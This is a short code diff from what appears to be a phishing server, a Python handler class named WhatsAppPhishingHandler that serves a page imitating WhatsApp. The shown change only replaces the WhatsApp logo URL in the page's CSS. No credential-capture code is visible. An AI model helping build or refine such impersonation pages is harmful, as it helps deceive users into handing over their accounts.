@@ -108,7 +108,7 @@ class WhatsAppPhishingHandler(BaseHTTPRequestHandler):
 .whatsapp-logo {
     width: 120px; height: 120px; margin: 0 auto 20px;
     background-color: #25D366;
-    background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/800px-WhatsApp.svg.png');
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg');
     background-size: contain;
     background-position: center;
     background-repeat: no-repeat;
